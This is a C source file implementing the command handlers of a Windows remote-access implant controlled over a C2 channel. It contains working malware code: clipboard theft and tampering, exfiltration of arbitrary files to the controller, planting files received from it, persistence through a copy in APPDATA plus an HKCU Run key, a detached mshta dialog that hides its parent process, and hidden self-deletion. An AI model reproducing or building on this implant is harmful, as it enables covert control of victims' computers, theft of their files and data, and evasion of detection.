/*
 * client/handlers_ui.c  –  UI, filesystem I/O, and persistence handlers
 * =======================================================================
 * Implements the native C2 verb handlers for:
 *   getclip           — read clipboard text
 *   setclip <text>    — write clipboard text
 *   msgbox <t> <m>    — show a dialog via mshta.exe (detached, no parent link)
 *   upload <name>     — receive a file from C2 and write to disk
 *   download <path>   — read a file from disk and send to C2
 *   persist <k> <f>   — copy agent to APPDATA and set HKCU Run key
 *   self_destruct     — remove run key and schedule EXE deletion, then exit
 *
 * All functions are declared in shell_internal.h and only called from
 * the dispatch loop in shell.c.
 */

#include "shell_internal.h"

#include <Windows.h>
#include <winsock2.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>


/* ── _handle_getclip ────────────────────────────────────────────────────── */

void _handle_getclip(TLS_CONTEXT *pTls)
{
    if (!OpenClipboard(NULL)) {
        _send_str(pTls, "[-] getclip: OpenClipboard failed");
        return;
    }
    HANDLE hData = GetClipboardData(CF_TEXT);
    if (!hData) {
        CloseClipboard();
        _send_str(pTls, "[-] getclip: no text in clipboard");
        return;
    }
    const char *text = (const char *)GlobalLock(hData);
    if (text) {
        _send_str(pTls, text);
        GlobalUnlock(hData);
    } else {
        _send_str(pTls, "[-] getclip: GlobalLock failed");
    }
    CloseClipboard();
}


/* ── _handle_setclip ────────────────────────────────────────────────────── */

void _handle_setclip(TLS_CONTEXT *pTls, const char *text)
{
    size_t len = strlen(text) + 1;
    HGLOBAL hMem = GlobalAlloc(GMEM_MOVEABLE, len);
    if (!hMem) { _send_str(pTls, "[-] setclip: GlobalAlloc failed"); return; }

    char *dst = (char *)GlobalLock(hMem);
    if (!dst) { GlobalFree(hMem); _send_str(pTls, "[-] setclip: GlobalLock failed"); return; }
    memcpy(dst, text, len);
    GlobalUnlock(hMem);

    if (!OpenClipboard(NULL)) {
        GlobalFree(hMem);
        _send_str(pTls, "[-] setclip: OpenClipboard failed");
        return;
    }
    EmptyClipboard();
    if (SetClipboardData(CF_TEXT, hMem))
        _send_str(pTls, "[+] clipboard updated");
    else {
        GlobalFree(hMem);
        _send_str(pTls, "[-] setclip: SetClipboardData failed");
    }
    CloseClipboard();
}


/* ── _handle_msgbox ─────────────────────────────────────────────────────── */
/*
 * Spawns the dialog via  mshta vbscript:MsgBox(...)  as a fully detached
 * process so it appears in Task Manager under "mshta.exe" with no parent
 * relationship to the agent.
 */
void _handle_msgbox(TLS_CONTEXT *pTls, const char *args)
{
    char title[256] = {0};
    char msg[512]   = {0};
    const char *p = args;
    size_t ti = 0;
    while (*p && *p != ' ' && ti < sizeof(title) - 1) title[ti++] = *p++;
    if (*p == ' ') p++;
    strncpy(msg, p, sizeof(msg) - 1);

    char cmd[1200] = {0};
    _snprintf(cmd, sizeof(cmd) - 1,
        "mshta.exe \"vbscript:MsgBox(\"%s\",0,\"%s\")(window.close)\"",
        msg, title);

    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    si.cb = sizeof(si);

    BOOL ok = CreateProcessA(
        NULL, cmd,
        NULL, NULL, FALSE,
        CREATE_NO_WINDOW | DETACHED_PROCESS,
        NULL, NULL, &si, &pi);

    if (ok) {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        _send_str(pTls, "[+] msgbox displayed");
    } else {
        char buf[64];
        _snprintf(buf, sizeof(buf) - 1,
            "[-] msgbox: CreateProcess failed (err %lu)", GetLastError());
        _send_str(pTls, buf);
    }
}


/* ── _handle_upload ─────────────────────────────────────────────────────── */

void _handle_upload(TLS_CONTEXT *pTls, const char *filename)
{
    BYTE  *pData  = NULL;
    DWORD  cbData = 0;

    if (!tls_recv_msg(pTls, &pData, &cbData)) {
        _send_str(pTls, "[-] upload: receive failed");
        return;
    }

    FILE *f = fopen(filename, "wb");
    if (!f) {
        free(pData);
        char buf[MAX_PATH + 32];
        _snprintf(buf, sizeof(buf) - 1, "[-] upload: cannot write: %s", filename);
        _send_str(pTls, buf);
        return;
    }
    size_t nWritten = fwrite(pData, 1, cbData, f);
    fclose(f);
    free(pData);

    char buf[MAX_PATH + 32];
    if (nWritten != (size_t)cbData)
        _snprintf(buf, sizeof(buf) - 1,
            "[-] upload: write error: %s (%zu of %lu bytes)",
            filename, nWritten, (unsigned long)cbData);
    else
        _snprintf(buf, sizeof(buf) - 1,
            "[+] Received: %s (%lu bytes)", filename, (unsigned long)cbData);
    _send_str(pTls, buf);
}


/* ── _handle_download ────────────────────────────────────────────────────── */

void _handle_download(TLS_CONTEXT *pTls, const char *path)
{
    FILE *f = fopen(path, "rb");
    if (!f) {
        char buf[MAX_PATH + 32];
        _snprintf(buf, sizeof(buf) - 1, "[-] download: not found: %s", path);
        _send_str(pTls, buf);
        return;
    }

    fseek(f, 0, SEEK_END);
    long sz = ftell(f);
    fseek(f, 0, SEEK_SET);

    if (sz <= 0 || sz > (long)(256 * 1024 * 1024)) {
        fclose(f);
        _send_str(pTls, "[-] download: file too large or empty");
        return;
    }

    BYTE *buf = (BYTE *)malloc((size_t)sz);
    if (!buf) { fclose(f); _send_str(pTls, "[-] download: OOM"); return; }

    size_t nRead = fread(buf, 1, (size_t)sz, f);
    fclose(f);
    if (nRead != (size_t)sz) {
        free(buf); _send_str(pTls, "[-] download: read error"); return;
    }

    _send_str(pTls, "FILE_OK");
    tls_send_msg(pTls, buf, (DWORD)sz);
    free(buf);
}


/* ── _handle_persist ─────────────────────────────────────────────────────── */

void _handle_persist(TLS_CONTEXT *pTls, const char *args)
{
    char regkey[256] = {0}, filename[256] = {0};
    if (sscanf(args, "%255s %255s", regkey, filename) != 2) {
        _send_str(pTls, "Usage: persist <regkey> <filename>");
        return;
    }

    char appdata[MAX_PATH] = {0};
    if (!GetEnvironmentVariableA("APPDATA", appdata, sizeof(appdata))) {
        _send_str(pTls, "[-] persist: APPDATA not set");
        return;
    }

    char dst[MAX_PATH] = {0};
    _snprintf(dst, sizeof(dst) - 1, "%s\\%s", appdata, filename);

    char src[MAX_PATH] = {0};
    GetModuleFileNameA(NULL, src, sizeof(src));

    if (GetFileAttributesA(dst) != INVALID_FILE_ATTRIBUTES) {
        _send_str(pTls, "[-] persist: already exists");
        return;
    }
    if (!CopyFileA(src, dst, TRUE)) {
        _send_str(pTls, "[-] persist: CopyFile failed");
        return;
    }

    char regCmd[512];
    _snprintf(regCmd, sizeof(regCmd) - 1,
        "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" "
        "/v \"%s\" /t REG_SZ /d \"%s\" /f", regkey, dst);
    system(regCmd);
    _send_str(pTls, "[+] persistence installed");
}


/* ── _handle_self_destruct ──────────────────────────────────────────────── */

void _handle_self_destruct(TLS_CONTEXT *pTls)
{
    system("reg delete \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" "
           "/f >nul 2>&1");

    char exePath[MAX_PATH] = {0};
    GetModuleFileNameA(NULL, exePath, sizeof(exePath));

    _send_str(pTls, "[+] registry run key removed\n[*] self-destruct — terminating.");

    char bat[MAX_PATH + 64];
    _snprintf(bat, sizeof(bat) - 1,
        "cmd.exe /c ping 127.0.0.1 -n 2 >nul & del /f /q \"%s\"", exePath);
    WinExec(bat, SW_HIDE);

    tls_disconnect(pTls);
    WSACleanup();
    ExitProcess(0);
}
